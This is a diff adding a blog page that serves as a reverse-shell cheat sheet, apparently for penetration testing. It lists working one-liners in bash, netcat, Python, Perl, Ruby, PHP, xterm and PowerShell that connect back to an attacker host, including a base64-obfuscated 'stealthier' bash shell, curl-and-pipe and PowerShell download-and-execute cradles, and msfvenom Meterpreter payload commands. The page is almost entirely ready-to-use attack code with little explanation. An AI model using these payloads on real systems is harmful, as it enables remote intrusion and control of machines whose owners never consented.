@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KageHayashi" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      shells 
+      
+      
+      |
+    
+     KageHayashi
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/t-apple-touch-icon.png">
+    <link rel="icon" href="/images/takeda_white_small.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Nunito&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Kanit&display=swap" rel="stylesheet">
+
+<div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img id="author_photo" src="/images/light.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">KageHayashi</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/cheatsheets/">
+          <a href="/cheatsheets/">Cheat Sheets</a>
+        </li>
+      
+        <li class="nav-item" data-path="/shells/">
+          <a href="/shells/">Shells</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">shells</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-03-09 12:55:45
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="Linux-Shells"><a href="#Linux-Shells" class="headerlink" title="Linux Shells"></a>Linux Shells</h1><h2 id="Bash-sh"><a href="#Bash-sh" class="headerlink" title="Bash | sh"></a>Bash | sh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl https://reverse-shell.sh/1.1.1.1:3000 | bash <span class="comment"># Reverse shell as a service</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/udp/127.0.0.1/4242 0&gt;&amp;1 <span class="comment">#UDP</span></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;; <span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Short and bypass (credits to Dikline)</span></span><br><span class="line">(sh)0&gt;/dev/tcp/10.10.10.10/9091</span><br><span class="line"><span class="comment"># after getting the previous shell to get the output to execute</span></span><br><span class="line"><span class="built_in">exec</span> &gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<h2 id="Symbol-Safe-Bash-sh"><a href="#Symbol-Safe-Bash-sh" class="headerlink" title="Symbol Safe Bash | sh"></a>Symbol Safe Bash | sh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># If you need a more stable connection do:</span></span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stealthier method</span></span><br><span class="line"><span class="comment"># B64 encode the shell like: echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.8.4.185/4444 0&gt;&amp;1&#x27;&quot; | base64 -w0</span></span><br><span class="line"><span class="built_in">echo</span> bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | <span class="built_in">base64</span> -d | bash 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h3 id="Explanation"><a href="#Explanation" class="headerlink" title="Explanation"></a>Explanation</h3><ol>
+<li><code>bash -i</code>: This part of the command starts an interactive (<code>-i</code>) Bash shell.</li>
+<li><code>&gt;&amp;</code>: This part of the command is a shorthand notation for redirecting both standard output (<code>stdout</code>) and standard error (<code>stderr</code>) to the same destination.</li>
+<li><code>/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;</code>: This is a special file that represents a TCP connection to the specified IP address and port.<ul>
+<li>By redirecting the output and error streams to this file, the command effectively sends the output of the interactive shell session to the attacker’s machine.</li>
+</ul>
+</li>
+<li><code>0&gt;&amp;1</code>: This part of the command redirects standard input (<code>stdin</code>) to the same destination as standard output (<code>stdout</code>).</li>
+</ol>
+<h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh &lt;ATTACKER-IP&gt; &lt;PORT&gt;</span><br><span class="line">nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; | /bin/sh <span class="comment"># Blind</span></span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; &gt;/tmp/f</span><br><span class="line">nc &lt;ATTACKER-IP&gt; &lt;PORT1&gt;| /bin/bash | nc &lt;ATTACKER-IP&gt; &lt;PORT2&gt;</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/bkpipe;<span class="built_in">mknod</span> /tmp/bkpipe p;/bin/sh 0&lt;/tmp/bkpipe | nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; 1&gt;/tmp/bkpipe</span><br></pre></td></tr></table></figure>
+
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux</span></span><br><span class="line"><span class="built_in">export</span> RHOST=<span class="string">&quot;127.0.0.1&quot;</span>;<span class="built_in">export</span> RPORT=12345;python -c <span class="string">&#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"><span class="comment">#IPv6</span></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;&lt;ATTACKER-IP&gt;&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;[IPADDR]:[PORT]&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;[IPADDR]&quot;,&quot;[PORT]&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Using &#x27;exec&#x27; is the most common method, but assumes that the file descriptor will be 3.</span></span><br><span class="line"><span class="comment"># Using this method may lead to instances where the connection reaches out to the listener and then closes.</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Using &#x27;proc_open&#x27; makes no assumptions about what the file descriptor will be.</span></span><br><span class="line"><span class="comment"># See https://security.stackexchange.com/a/198944 for more information</span></span><br><span class="line">&lt;?php <span class="variable">$sock</span>=fsockopen(<span class="string">&quot;10.0.0.1&quot;</span>,1234);<span class="variable">$proc</span>=proc_open(<span class="string">&quot;/bin/sh -i&quot;</span>,array(0=&gt;<span class="variable">$sock</span>, 1=&gt;<span class="variable">$sock</span>, 2=&gt;<span class="variable">$sock</span>), <span class="variable">$pipes</span>); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php <span class="built_in">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;/dev/tcp/10.10.14.8/4444 0&gt;&amp;1&#x27;&quot;</span>); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h2><p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display 10.0.0.1:1</span><br></pre></td></tr></table></figure>
+<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xnest :1</span><br></pre></td></tr></table></figure>
+<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhost +targetip</span><br></pre></td></tr></table></figure>
+
+<h1 id="Windows-Shells"><a href="#Windows-Shells" class="headerlink" title="Windows Shells"></a>Windows Shells</h1><h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -e <span class="built_in">cmd</span>.exe &lt;Attacker_IP&gt; &lt;PORT&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><p><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="string">&quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#x27;http://10.2.0.5/shell.ps1&#x27;)|iex&quot;</span></span><br><span class="line">powershell <span class="string">&quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://10.10.14.9:8000/ipw.ps1&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-NoNewWindow</span> powershell <span class="string">&quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://10.222.0.26:8000/ipst.ps1&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://10.10.14.13:8000/PowerUp.ps1&#x27;</span>) | powershell <span class="literal">-noprofile</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="PS-Oneliner"><a href="#PS-Oneliner" class="headerlink" title="PS Oneliner"></a>PS Oneliner</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.10&quot;</span>,<span class="number">80</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Full-TTYs-Stablize-Shells"><a href="#Full-TTYs-Stablize-Shells" class="headerlink" title="Full TTYs (Stablize Shells)"></a>Full TTYs (Stablize Shells)</h1><h2 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">CTRL+Z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">&lt;ENTER ENTER&gt;</span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/bash</span><br><span class="line"><span class="built_in">export</span> TERM=screen</span><br><span class="line"><span class="built_in">stty</span> rows &lt;rows&gt; columns &lt;cols&gt;</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="MSFVenom-Cheatsheet"><a href="#MSFVenom-Cheatsheet" class="headerlink" title="MSFVenom Cheatsheet"></a>MSFVenom Cheatsheet</h1><p>list payloads</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads <span class="comment">#Payloads</span></span><br><span class="line">msfvenom -l encoders <span class="comment">#Encoders</span></span><br></pre></td></tr></table></figure>
+
+<p>common params</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-b <span class="string">&quot;\x00\x0a\x0d&quot;</span> </span><br><span class="line">-f c </span><br><span class="line">-e x86/shikata_ga_nai -i 5 </span><br><span class="line">EXITFUNC=thread</span><br><span class="line">PrependSetuid=True <span class="comment">#Use this to create a shellcode that will execute something with SUID</span></span><br></pre></td></tr></table></figure>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &gt; reverse.elf</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-03-09 12:55:45
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-Shells"><span class="toc-text">Linux Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash-sh"><span class="toc-text">Bash | sh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Symbol-Safe-Bash-sh"><span class="toc-text">Symbol Safe Bash | sh</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Explanation"><span class="toc-text">Explanation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Netcat"><span class="toc-text">Netcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python"><span class="toc-text">Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl"><span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby"><span class="toc-text">Ruby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xterm"><span class="toc-text">xterm</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Shells"><span class="toc-text">Windows Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NC"><span class="toc-text">NC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerShell"><span class="toc-text">PowerShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PS-Oneliner"><span class="toc-text">PS Oneliner</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Full-TTYs-Stablize-Shells"><span class="toc-text">Full TTYs (Stablize Shells)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-1"><span class="toc-text">Python</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSFVenom-Cheatsheet"><span class="toc-text">MSFVenom Cheatsheet</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/kagehayashi">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/kagehayashi">Copyright © 2024 KageHayashi</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        ▰▰▰
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
